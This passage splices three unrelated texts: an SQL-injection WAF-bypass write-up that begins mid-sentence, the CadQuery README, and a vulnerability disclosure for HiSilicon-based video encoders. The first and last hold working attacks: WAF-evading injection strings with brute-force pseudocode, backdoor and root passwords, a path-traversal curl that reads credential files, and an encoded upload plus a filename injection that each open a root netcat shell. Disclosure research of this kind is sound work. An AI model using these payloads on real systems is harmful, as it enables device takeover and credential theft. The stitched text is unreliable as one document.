came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.

Details about the application
The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:

POST /index.php HTTP/1.1
Host: ******
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:

SELECT c1,c2,c3 FROM t1 WHERE X-MARK;The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.

To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:

SELECT c1,c2,c3 FROM t1 WHERE 'a'='a';the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:

SELECT c1,c2,c3 FROM t1 WHERE 'a'='b';the server responded with status 500 Internal Server Error.

In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.

First Try
My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):

'a' =
 (SELECT SUBSTRING(table_name, 2, 1)
  FROM information_schema.tables
  LIMIT 4, 1
 )which would result in the following SQL query to be executed on the server:

SELECT c1,c2,c3 FROM t1
WHERE 'a' =
 (SELECT SUBSTRING(table_name, 2, 1)
  FROM information_schema.tables
  LIMIT 4, 1
 )When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:

INJECTION 1

'a' =
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = ""t1""
  LIMIT 0, 1
 )and then actually get values out of column c1 of table t1 by starting with the
following injection:

'a' =
 (SELECT SUBSTRING(c1, 1, 1)
  FROM t1
  LIMIT 0, 1
 )The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection

'a' = 'b'would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:

'a' LIKE 'b'This means that the initial injection INJECTION 1 would become:

'a' LIKE
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = ""t1""
  LIMIT 0, 1
 )Second Try
INJECTION 1 was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection

'a' LIKE 'b'would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:

'0x61' LIKE 'b'The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:

'0x61' LIKE 'a'still returns True, and

'0x61' LIKE 'b'passes through undetected and returns False.

The resulting INJECTION 1 now looks like this:

'0x61' LIKE
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = ""t1""
  LIMIT 0, 1
 )Third Try
The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:

SELECT c1,c2,c3 FROM t1 WHERE '0x61' LIKE 'b'but with a multi-line comment trick, the new query would go through undetected:

SELECT/*trick comment*/ c1,c2,c3
FROM/*trick comment*/ t1
WHERE '0x61' LIKE 'b'Thus, applying this method on INJECTION 1, would make it look like this:

'0x61' LIKE
 (SELECT/*trick comment*/ SUBSTRING(column_name, 1, 1)
  FROM/*trick comment*/ information_schema.columns
  WHERE table_name = ""t1""
  LIMIT 0, 1
 )The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.

Full Speed Ahead
To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:

# assert names of columns and table name is known
alphabet = [a,b,c,...,y,z]
characterPosition = 1 # the position of the character we are bruteforcing
for rowNumber in [0,20]:
  for columnName in columns:
    for character in alphabet:
      sqlInjection = '''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''

      inject sqlInjection is POST request body
      if response.status == 200:
        result += character
        recurse function with characterPosition++
      elif response.status == 500:
        continue with next character in alphabet

      return resultAnd this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in Cloudflare’s HoF.

Mitigation
Cloudlfare reviewed and fixed the vulnerability a few days after my report.
The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
OWASP.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.

CadQuery






What is CadQuery
CadQuery is an intuitive, easy-to-use Python module for building parametric 3D CAD models. Using CadQuery, you can write short, simple scripts that produce high quality CAD models. It is easy to make many different objects using a single script that can be customized.
CadQuery is often compared to OpenSCAD. Like OpenSCAD, CadQuery is an open-source, script based, parametric model generator. However, CadQuery stands out in many ways and has several key advantages:
The scripts use a standard programming language, Python, and thus can benefit from the associated infrastructure. This includes many standard libraries and IDEs.
CadQuery's CAD kernel Open CASCADE Technology (OCCT) is much more powerful than CGAL. Features supported natively by OCCT include NURBS, splines, surface sewing, STL repair, STEP import/export, and other complex operations, in addition to the standard CSG operations supported by CGAL
Ability to import/export STEP and the ability to begin with a STEP model, created in a CAD package, and then add parametric features. This is possible in OpenSCAD using STL, but STL is a lossy format.
CadQuery scripts require less code to create most objects, because it is possible to locate features based on the position of other features, workplanes, vertices, etc.
CadQuery scripts can build STL, STEP, and AMF faster than OpenSCAD.
Key features
Build 3D models with scripts that are as close as possible to how you would describe the object to a human.
Create parametric models that can be very easily customized by end users.
Output high quality (loss-less) CAD formats like STEP and DXF in addition to STL and AMF.
Provide a non-proprietary, plain text model format that can be edited and executed with only a web browser.
Offer advanced modeling capabilities such as fillets, curvelinear extrudes, parametric curves and lofts.
Why this fork
The original version of CadQuery was built on the FreeCAD API. This was great because it allowed for fast development and easy cross-platform capability. However, we eventually started reaching the limits of the API for some advanced operations and selectors. This 2.0 version of CadQuery is based directly on a Python wrapper of the OCCT kernel. This gives us a great deal more control and flexibility, at the expense of some simplicity and having to handle the cross-platform aspects of deployment ourselves. We believe this is a worthwhile trade-off to allow CadQuery to continue to grow and expand in the future.
Getting started
It is currently possible to use CadQuery for your own projects in 3 different ways:
Using the CQ-editor GUI
From a Jupyter notebook
As a standalone library
The easiest way to install CadQuery and its dependencies is using conda:
conda install -c conda-forge -c cadquery cadquery=2

Development version can be installed as well:
conda install -c conda-forge -c cadquery cadquery=master

For those who are interested, the OCP repository contains the current OCCT wrapper used by CQ.
CQ-editor GUI
CQ-editor is an IDE that allows users to edit CadQuery model scripts in a GUI environment. It includes features such as:
A graphical debugger that allows you to step through your scripts.
A CadQuery stack inspector.
Export to various formats, including STEP and STL, directly from the menu.
The installation instructions for CQ-editor can be found here.

Jupyter
CadQuery supports Jupyter notebook out of the box using the jupyter-cadquery extension created by @bernhard-42:
Installation
Usage

Standalone
CadQuery was built to be used as a Python library without any GUI. This makes it great for use cases such as integration into servers, or creating scientific and engineering scripts. Use Anaconda/Miniconda to install CadQuery, and then add import cadquery to the top of your Python scripts.
conda install -c conda-forge -c cadquery cadquery=2

Getting help
You can find the full CadQuery documentation at cadquery.readthedocs.io.
We also have a Google Group to make it easy to get help from other CadQuery users. We want you to feel welcome and encourage you to join the group and introduce yourself. We would also love to hear what you are doing with CadQuery.

Contributing
Contributions from the community are welcome and appreciated.
You do not need to be a software developer to have a big impact on this project. Contributions can take many forms including, but not limited to, the following:
Writing and improving documentation
Triaging bugs
Submitting bugs and feature requests
Creating tutorial videos and blog posts
Helping other users get started and solve problems
Telling others about this project
Helping with translations and internationalization
Helping with accessibility
Contributing bug fixes and new features
It is asked that all contributions to this project be made in a respectful and considerate way. Please use the Python Community Code of Conduct's guidelines as a reference.
Contributing code
If you are going to contribute code, make sure to follow this steps:
Consider opening an issue first to discuss what you have in mind
Try to keep it as short and simple as possible (if you want to change several
things, start with just one!)
Fork the CadQuery repository, clone your fork and create a new branch to
start working on your changes
Create a conda development environment with something like:
conda env create -n cq-dev -f environment.yml

Activate the new conda enviornment:
conda activate cq-dev

If desired, install the master branch of cq-editor (Note; a release version may not be compatible with the master branch of cadquery):
conda install -c cadquery -c conda-forge cq-editor=master
Installing cq-editor adds another instance of cadquery which overrides the clone just added. Fix this by reinstalling cadquery using pip:
pip install -e .

Before making any changes verify that the current tests pass. Run pytest from the root of your cadquery clone, there should be no failures and the output will look similar to this:
======= 215 passed, 57 warnings in 13.95s =======

Start with the tests! How should CadQuery behave after your changes? Make
sure to add some tests to the test suite to ensure proper behavior
Make sure your tests have assertions checking all the expected results
Add a nice docstring to the test indicating what the test is doing; if there
is too much to explain, consider splitting the test in two!
Go ahead and implement the changes
Add a nice docstring to the functions/methods/classes you implement
describing what they do, what the expected parameters are and what it returns
(if anything)
Update the documentation if there is any change to the public API
Consider adding an example to the documentation showing your cool new
feature!
Make sure nothing is broken (run the complete test suite with pytest)
Run black to autoformat your code and make sure your code style complies
with CadQuery's
Push the changes to your fork and open a pull-request upstream
Keep an eye on the automated feedback you will receive from the CI pipelines;
if there is a test failing or some code is not properly formatted, you will
be notified without human intervention
Be prepared for constructive feedback and criticism!
Be patient and respectful, remember that those reviewing your code are also
working hard (sometimes reviewing changes is harder than implementing them!)
How to Report a Bug
When filing a bug report issue, please be sure to answer these questions:
What version of the software are you running?
What operating system are you running the software on?
What are the steps to reproduce the bug?
How to Suggest a Feature or Enhancement
If you find yourself wishing for a feature that does not exist, you are probably not alone. There are bound to be others out there with similar needs. Open an issue which describes the feature you would like to see, why you need it, and how it should work.

  Backdoors and other vulnerabilities in HiSilicon based hardware video encoders
  15 Sep 2020
  

Update 2020-09-17: Huawei issued a statement saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.

This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.

See CERT/CC vulnerability note VU#896979

During my research I had physical access to several devices from the following vendors: URayTech, J-Tech Digital, and Pro Video Instruments. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.

There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: Network Technologies Incorporated (NTI), Oupree, MINE Technology, Blankom, ISEEVY, Orivision, WorldKast/procoder, Digicast

It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize shodan.io to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.

Background

Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on HiSilicon (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.

Security research on HiSilicon devices has been done in the past. Here are some existing publications:

Root shell in IP cameras (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.
  HiSilicon DVR hack by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.
  Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.
While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the admin web application specific to the video encoders and does not overlap with the prior work.

Hardware

Here is a few pictures of one of the devices I had an opportunity to test.

Physical ports

Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in

Let’s plug this thing in, connect to network, and start exploring!

Network recon

A simple nmap scan reports the following open ports:

$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown


23 - telnet

Telnet displays the login prompt, but the password is unknown at this point:

(none) login: 


80, 8086 - web application

Both ports serve the main admin web interface. The default credentials are admin/admin


The login prompt suggests basic HTTP authentication, but this is actually digest authentication. The following header is returned by the application:

WWW-Authenticate: Digest qop=""auth"", ...


and the browser authenticates with:

Authorization: Digest username=""admin"", ...


(as I will demonstrate below, digest is not the only authentication method supported by the application)

After logging in, the user sees a simple web interface.


Note that vendors customize the interface, and your device can display something completely different, such as:
However, the underlying functionality (the web API calls) are all the same regardless of the UI.

There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.

554, 8554 - RTSP

RTSP stands for Real Time Streaming Protocol. If it’s enabled, one can watch the video stream directly from the encoder.

$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN


1935 - RTMP

Real Time Messaging Protocol, another way to deliver video

5150 - serial to TCP

Mysterious service. netcat connects but the server does not seem to react to any input

$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...


This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:


9588 - another web server

This one is nginx, but not exactly clear what it is for.

$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0

<title>Welcome to nginx!</title>
...


Firmware analysis

Clicking around the web interface, I noticed the backup feature:

I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.

Content

The firmware backup is a RAR archive that can be easily unpacked:

$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...


Here is the directory structure:

$ tree -d

The most important things are in the root of the archive:

In addition to some general utilities ( hostapd, png2bmp, remserial, wpa_cli, wpa_supplicant) it contains the custom web application box.v400_hdmi which is a compiled binary:

$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped


This executable is the primary target of my research, and all the vulnerabilities were found in it.

Password file and telnet access

The firmware includes passwd file which is a standard Linux password file:

$ cat passwd 
root:9yVwSCpfKcYJg:0:0::/root:/bin/sh


Update 2020-09-16: Thanks to Vladislav Yarmak for quickly brute forcing this hash. The original password appears to be newsheen.

My initial thought was to crack the password by conventional means, but after thinking about it I had a better idea. The password file is copied to the system by the run script, right before the main application is launched:

$ cat -n run
...
    66  cp /tmp/passwd /etc/
    67
    68  cd /tmp/
    69  ./reset &
    70  ./box.v400_hdmi


To my understanding this run script executes upon device boot, so all I need to do is following:

Generate my own passwd
  Repackage the firmware
  Upload the firmware to the device
  Reboot
  Try telnet with my own password
Generating a password hash is easy with openssl passwd command. Let’s set the password to “root”:

$ openssl passwd -crypt root
5RRcUw5UocPOY


My new passwd looks like this:

root:5RRcUw5UocPOY:0:0::/root:/bin/sh


I use WinRAR on a Windows VM to repackage the firmware, to be consistent with the original firmware that reported a downlevel archive version 4 and Win32 platform. I specify RAR 4 in WinRAR’s parameters:


I upload the “new” firmware to the device via the web interface, reboot, and voila:

$ telnet encoder
Trying 10.7.7.51...
Connected to encoder.
Escape character is '^]'.

(none) login: root
Password: root 
Welcome to HiLinux.
None of nfsroot found in cmdline.
~ # 


Local recon

Now that I have full root access to the device, I can dump all sorts of stuff.

Looking at this list, one can sort of reconstruct the loading sequence for the main web application:
rcS → load → run → box.v400_hdmi

Indeed:

/ # cat /etc/init.d/rcS
...
cd /box/
chmod 777 ./load
./load


/ # cat /box/load
...
cd /tmp/
chmod 777 ./run
./run


/ # cat /tmp/run
...
cd /tmp/
./reset &
./box.v400_hdmi


By manipulating these scripts, I could alter the boot flow, which was quite handy during reverse engineering and debugging later on. I modified /box/load to set a static IP address on my subnet, and commented out the execution of run script. This way I could have a clean shell after reboot where I could start the executable(s) I wanted the way I wanted.

Here is the answer on who listens on port 5150 - it’s remserial. Process info one more time:

  252 root   0:00 ./remserial -p 5150 -s 9600 raw /dev/ttyAMA1


remserial bridges a local serial port and a network port, allowing entities on the network to communicate with the serial port is if they were local on the machine. Hm… this doesn’t sound cool. I looked in dmesg again and found this:

Serial: AMBA PL011 UART driver
12080000.uart: ttyAMA0 at MMIO 0x12080000 (irq = 38, base_baud = 0) is a PL011 rev2
console [ttyAMA0] enabled
12090000.uart: ttyAMA1 at MMIO 0x12090000 (irq = 39, base_baud = 0) is a PL011 rev2
120a0000.uart: ttyAMA2 at MMIO 0x120a0000 (irq = 40, base_baud = 0) is a PL011 rev2


I have to admit I’m not a hardware expert but I understand /dev/ttyAMA? are interfaces for the device’s UART. I searched for the UART specs for this board and found this PDF that I think may be helpful but I didn’t have much time to pursue this so I still don’t know whether this port exposure can be exploited and how. If someone wants to hack this, please do! (let me know what you find)

Dumping the file system

When sftp and rsync are not available, I like to use netcat to pull files from a remote systems. Luckily, nc is present on the device.

First, I start a tar archive process and pipe its output to nc listener on port 1337:

~ # cd /
/ # tar cf - bin boot box etc home lib mnt nfsroot opt root sbin share tmp usr | nc -lp 1337


Now, pull the archive to my machine:

$ nc -w 1 encoder 1337 > dump.tar


Reverse engineering

As I mentioned above, the main application is the executable named box.v400_hdmi on this particular device. Other devices may use other names. This app is a real workhorse - it listens on multiple ports, serves the web UI, and performs a bunch of low level tasks behind the scenes.

First, let’s see what threads it runs:

~ # ps -T | grep v400_hdmi
 229 root   1:56 {main} ./box.v400_hdmi
 233 root   0:25 {disk.writer} ./box.v400_hdmi
 234 root   0:00 {tty_read} ./box.v400_hdmi
 235 root   0:01 {main} ./box.v400_hdmi
 236 root   0:00 {main} ./box.v400_hdmi
 253 root   0:00 {route_check} ./box.v400_hdmi
 254 root   0:00 {accept0_80} ./box.v400_hdmi
 255 root   0:00 {accept1_8086} ./box.v400_hdmi
 256 root   0:26 {mt2st_80} ./box.v400_hdmi
 257 root   0:00 {accept0_554} ./box.v400_hdmi
 258 root   0:00 {accept1_8554} ./box.v400_hdmi
 259 root   0:25 {mt2st_554} ./box.v400_hdmi
 262 root   0:00 {discover} ./box.v400_hdmi
 263 root   0:00 {broadcast} ./box.v400_hdmi
 264 root   0:01 {timer} ./box.v400_hdmi
 265 root   0:00 {SRT:GC} ./box.v400_hdmi
1620 root   0:00 {rtmp0} ./box.v400_hdmi
1621 root   0:00 {hi_Aenc_Get} ./box.v400_hdmi
1622 root   0:00 {hi_Aenc_Get} ./box.v400_hdmi


One thread that immediately looks suspicious is tty_read. Is this the one that handles ttyAMA1 via remserial? Let’s see which processes use the tty devices:

~ # fuser /dev/ttyAMA1
261 
~ # fuser /dev/ttyAMA2
229 252 261


Argh… No, this thread seems to handle ttyAMA2 which is not exposed via remserial… OK, let’s move on.

Modifying the boot

I don’t necessarily want the target application to start automatically when the device boots while debugging. We can change that by disabling autostart through modifying the /box/load script:

...
cd /tmp/
ifconfig eth0 10.7.7.51 netmask 255.255.255.0 # add: static IP address
route add default gw 10.7.7.1 dev eth0        # add: default gateway
chmod 777 ./run
#./run                   # comment out


Reboot, telnet, and behold a clean HiLinux. Now, let’s run the web app manually:

/tmp # ./run
chmod: lib/*: No such file or directory

The application prints a lot of information to the console. I’m sure this will be very handy during reverse engineering and debugging!

The run script does some prep work before launching box.v400_hdmi. Let’s see if we can just run the application alone. Reboot again and do this:

It works! I guess it won’t stream any video but that’s OK for now. All I’m interested in at this point is connecting a debugger and exploring the program.

Remote debugging

When reverse engineering binaries, I want to understand what’s exactly happening at runtime. In other words, I need to be able to run the target program in a debugger.

To debug the program on ARM, I need to get gdbserver for ARM with the corresponding gdb for my Linux workstation. The best way to do it is to download and compile Buildroot toolchain. I’ve downloaded the latest, unpacked, and ran make menuconfig. I needed to change the following options from their defaults:

Target options
    Target architecture
        ARM (little endian)  … [obvious]
        
    
  Build options
    libraries
        static only  …  [so gdbserver doesn’t depend on any shared libraries]
        
    
  Toolchain
    Enable WCHAR support  …  [for gdb]
      Thread library debugging  …  [for gdb]
      Enable C++ support  …  [for gdb]
      Build cross gdb for the host  …  [yes!]
        Python support  …  [for GEF - will explain later]
        
    
  Target packages
    Debugging, profiling and benchmark
        gdb
            gdbserver  …  [need this for the target rather than the full debugger]
            
        
    
Save the config and run make. If everything goes well (i.e. you had all the prerequisites before compiling), your toolchain will be available in 10-15 minutes. Of course, we are not interested in the full toolchain, we just need the debugger stuff.

Telnet to the encoder and start netcat listener for file transfer:

~ # nc -lp 1337 > gdbserver


On my workstation:

buildroot$ nc -w 1 encoder 1337 < ./output/target/usr/bin/gdbserver


Now back to the encoder:

~ # chmod +x gdbserver
~ # ./gdbserver --attach :2345 `pidof box.v400_hdmi`
Attached; pid = 107
Listening on port 2345


and back to workstation:

Good. However, vanilla GDB is not very useful for reverse engineering. Luckily, there are some add-ons that make a hacker’s life much easier. One of them is GEF. I’ve never used it before so I decided to give it a try. Unfortunately, GEF is based on Python3 but the buildroot debugger for ARM EABI only supports Python2. Fortunately, pytnon2-based GEF-legacy is available, and that’s what I’m going to use.

buildroot$ wget -O gef-legacy.py https://raw.githubusercontent.com/hugsy/gef-legacy/master/gef.py

buildroot$ echo source $PWD/gef-legacy.py >> output/staging/usr/share/buildroot/gdbinit

As you can see, the debugger’s output looks quite different! A lot of useful info out there! GEF automatically analyzes registers, follows pointers, displays strings, etc. Excellent!

Decompiling

Finally, I need to look at the code itself. I can just disassemble the binary with objdump but the result would be extremely difficult to comprehend. A better tool is needed. Ever since Ghidra came out back in 2019, I wanted to give it a try, and here is a great opportunity!

Download. Unpack. Run.

After creating a new project, I imported box.v400_hdmi into it, and Ghidra immediately began analyzing and decompiling it. It took a few minutes, but produced something I could actually work with:


Vulnerabilities and exploits

The juicy stuff. This section is the reason you are still reading this article :)

Backdoor password (CVE-2020-24215)

The first thing I looked at was the authentication function. Since I knew the default credentials (admin/admin), I used Ghidra to search for string ""admin"" in the binary, and found a single occurrence of it.

It is referenced twice in box_Authenticate()

To clarify: the name box_Authenticate did not come from Ghidra. Originally, this function was named something like FUN_00070114. Ghidra allows you to refactor the decompiled code by renaming things, so after confirming this was indeed the authentication function, I renamed it to box_Authenticate. All other box_ functions in this write-up were named in a similar way.

Here is the entire decompiled authentication function:


While looking at the ""admin"" string in the program’s data section, I noticed a strange string right next to it:


It is referenced in box_Authenticate():


Here is what’s going on:

line 12: the user-provided username is compared against ""admin""
  line 13: the user-provided password is compared against ""neworange88888888""
 if matched, return 1 (authentication succeeded)
  line 16: the user-provided username is compared against ""admin"" (again)
  lines 20-24: the user-provided password is compared against the value from settings
This smells like a backdoor. Let’s try it!

But first, let’s divert a bit…

As I mentioned earlier, although the web UI uses digest authentication, it is not the only authentication method supported by the application. The following two methods are also supported:

Basic HTTP authentication
  user/pass HTTP query parameters
I got these ideas from analyzing the function that calls box_Authenticate(). It is a pretty long function but it makes a few key decisions on what to allow and what to reject. I named this function box_ProcessRequest().

Here is an interesting excerpt from that function:


<rant> I wish Ghidra supported code folding so I could hide the irrelevant branch but it is still a feature request with no progress </rant>

Anyway… on line 257 it calls another function to check whether the authorization header contains ""Basic"". If so, the execution continues on line 280, where the header is first parsed and decoded, and then our familiar box_Authenticate() is called.

Here is the code in the same function that processes query parameters, user and pass:


To summarize, basic authentication and user/pass parameter pair are supported by the backend, and that’s what we are going to use to test the backdoor password:

Wrong password - no access (good)

request

curl -i --user admin:wrongpassword http://encoder/get_sys
curl -i ""http://encoder/get_sys?user=admin&pass=wrongpassword""

root access via telnet (CVE-2020-24218)

The telnet daemon is running on the device by default, and there is no way to disable it via the official admin web interface. It appears that on some devices (in particular, from URayTech) the above backdoor password is also set as the Linux root password, and remote login via telnet is possible. Furthermore, the password file format (crypt) only supports strings up to 8 characters, so instead of neworange88888888, one can just use neworang:

$ telnet uray
Trying 10.7.7.51...
Connected to uray.
Escape character is '^]'.

(none) login: root
Password: neworang
Welcome to HiLinux.
~ # 


Update 2020-09-16: Some versions of URayTech firmware set the root password to newsheen (thanks to Vladislav Yarmak)

Arbitrary file disclosure via path traversal (CVE-2020-24219)

Continuing through box_ProcessRequest(), I noticed an interesting conditional statement:

If the condition is true, the control is passed to the file read and HTTP response routines. This looks like a way to identify static files so they could be served without authentication. Nothing wrong with that but note the find() method used - it will succeed if the substring is found anywhere in the resource name.

Another issue is that the resource name is not sanitized and is simply appended to the web root directory path. If the request contains ../ a file outside of the web root will be served to the user.

This means that if there is a directory with one of the above substrings anywhere in its name, I will be able to combine these two flaws and read any file from the file system.

On the devices from at least one vendor, URayTech, one such directory does exist:

~ # ls -ld /sys/devices/media/13070000.jpgd
drwxr-xr-x 3 root root 0 Jan 1 08:00 /sys/devices/media/13070000.jpgd


Traversing from this directory, I can access any file on the file system using a path like this:
/sys/devices/media/13070000.jpgd/../../../../<path-to-any-file>

To exploit these flaws, I can just use curl to read any file from the encoder, for example:

$ curl -s --path-as-is ""http://encoder/../../sys/devices/media/13070000.jpgd/../../../../etc/passwd""
root:qiYX370VaJ3u.:0:0::/root:/bin/sh


I can read the encoder’s configuration file /box/box.ini to retrieve the actual admin password, and get full admin access to the device:

$ curl -s --path-as-is ""http://encoder/../../sys/devices/media/13070000.jpgd/../../../../box/box.ini"" | grep html_password
html_password:s3cr3t


Unauthenticated file upload (CVE-2020-24217)

Let’s continue looking through  box_ProcessRequest(). Here is another interesting part:


The two compare calls compare against ""multipart/form-data"". This is not obvious from the decompiled code but I can see it in the corresponding assembly:


The most interesting part here is that these requests completely skip authentication. box_ProcessRequest() immediately passes control to box_MultipartFormData() without checking any authentication parameters!

Looking at the traffic in Burp Suite, I noticed POST requests with multipart/form-data used by two functions:


    Firmware upgrade

  
  
    Logo upload

  
The parameter name is upgrade in both cases, which suggests both requests are handled by the same code. Also, the URL itself does not really matter. It can be /SystemE.html, /SetNet.html, or simply /, and it will still get processed.

Arbitrary code execution by uploading malicious firmware

Unauthenticated firmware upload means an anonymous attacker can upload and run arbitrary code. I can just pack and upload my own up.rar, but then I’ll have to wait until the device is rebooted, or utilize the backdoor password to call the reboot endpoint. Can this be exploited at will, without relying on external factors or another vulnerability? The answer is yes.

Apparently, up.rar is not the only firmware upgrade type. The procedure that parses a file upload HTTP request checks for several “supported” file names:


load just updates the /box/load script, box.ini updates the settings file, and so on…

I am not sure what  uk.rar is (maybe kernel/system upgrade?), but note the way it is processed by the application:


In other words, an attacker would just need to upload a RAR archive with a single shell script in it, and that script will get executed right away.

Here is such uk.rar:

$ unrar t uk.rar
...

Pathname/Comment  Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver
-------------------------------------------------------------------------------
 uk.txt             19       19 100% 02-07-20 08:03   .....A   5AB89351 m0? 2.9
-------------------------------------------------------------------------------


This embedded script uk.txt contains a single command:

$ cat uk.txt
nc -lp 1337 -e sh


This command will open a netcat listener with a shell on port 1337, allowing an attacker to connect to the device as root and execute arbitrary commands in the shell.

Create uk.rar as follows:
    echo ""UmFyIRoHAM+QcwAADQAAAAAAAAAYlHQgkCsAEwAAABMAAAACUZO4Wm9A4lAdMAYAgAAAAHVrLnR4dACwvOh+bmMgLWxwIDEzMzcgLWUgc2gKCsQ9ewBABwA="" | base64 -d > uk.rar
    
  
  Use curl command to upload the file to the device:
    curl -s -F 'upgrade=@uk.rar' http://encoder >/dev/null
    
    Note that the command above does not include any user credentials, i.e. this is an unauthenticated upload.
  
  Use nc (netcat) command to connect to the device on port 1337 and execute any commands as root. For example, you can retrieve the actual admin password stored in /box/box.ini:
    $ nc encoder 1337
sh -i
# whoami
root
# grep html_password /box/box.ini
html_password:s3cr3t
    
  
The device will reboot when you disconnect the netcat session. This is working as designed - see the call to box_Reboot().

Arbitrary code execution via command injection

As I mentioned earlier, the admin can upload a logo image to be overlaid over the video stream. The supported formats are BMP and PNG. When the user uploads a PNG file, the server application invokes png2bmp utility to convert the image:


The command string is built using the user-supplied file name without any sanitization, so an attacker can use the semicolon to inject arbitrary commands to execute. Let’s try it in Burp first:


This worked - a remote shell was opened!

Alternatively, one can just use curl command to inject the command nc -lp 1337 -e sh

curl -F ""upgrade=;filename=\""logo;nc -lp 1337 -e sh;.png\"""" http://encoder/


